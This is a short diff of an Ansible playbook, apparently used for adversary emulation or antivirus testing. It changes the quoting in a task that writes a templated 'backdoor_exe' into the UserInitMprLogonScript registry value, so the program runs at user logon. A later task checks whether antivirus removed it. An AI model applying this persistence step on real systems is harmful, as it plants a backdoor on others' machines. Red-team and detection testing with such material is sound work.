@@ -9,7 +9,7 @@
     win_regedit:
       path: HKCU:\Environment
       name: UserInitMprLogonScript
-      data: cmd.exe /c "{{ backdoor_exe }}"
+      data: cmd.exe /c {{ backdoor_exe }}
       type: string
       
   - name: sleep for 10 seconds and continue with play to check if AV removed or Not
